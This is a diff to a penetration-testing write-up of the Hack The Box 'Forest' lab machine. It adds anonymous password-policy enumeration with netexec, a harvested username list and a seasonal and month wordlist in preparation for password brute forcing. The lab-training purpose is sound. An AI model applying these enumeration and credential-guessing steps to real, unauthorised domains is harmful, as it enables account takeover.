@@ -73,9 +73,9 @@ SMB1 disabled -- no workgroup available
 ```
 I get a successful anonymous login but no connection since SMB1 is disabled for security reasons. 
 
-I try using crackmapexec to enumerate shares but I got a permission error. I did get the Windows Server version though:
+I try using netexec(new crackmapexec) to enumerate shares but I got a permission error. I did get the Windows Server version though:
 ```
-crackmapexec smb 10.10.10.161 --shares -u '' -p ''
+netexec smb 10.10.10.161 --shares -u '' -p ''
 Windows Server 2016 Standard 14393 x64
 Error enumerating shares: STATUS_ACCESS_DENIED
 ```
@@ -167,5 +167,62 @@ We can save this output to a text file and be able to pull all of the usernames 
 ```
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
 ```
+Before attempting a brute force attack, we can use netexec(new crackmapexec) to check the password policy to see how many password attempts we get before accounts get locked out:
+```
+netexec smb 10.10.10.161 --pass-pol -u '' -p ''
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
+SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
+SMB         10.10.10.161    445    FOREST           Minimum password length: 7
+SMB         10.10.10.161    445    FOREST           Password history length: 24
+SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
+SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
+SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
+SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
+SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
+SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
+SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
+SMB         10.10.10.161    445    FOREST           
+SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
+SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
+SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
+SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
+```
+According to this, we get unlimited password attempts since there is no Account Lockout Threshold. 
 
- 
+We can now try a bruteforce attempt using some of the usernames we have from the ldap bind:
+```
+sebastien
+lucinda
+andy
+mark
+santi
+svc-alfresco
+```
+and we can create a mutated password list that contains some of the most common parts of passwords. I used Ippsec's template, where we start with all the months of the year, as well as the current and prior year, the seasons in the year, the word password and secret, the name of the box, and the name htb for the platform.
+```
+January
+Febuary
+March
+April
+May
+June
+July
+August
+September
+October
+November
+December
+Password
+Secret
+htb
+Forest
+Autumn
+Spring
+Winter
+Fall
+Summer
+```
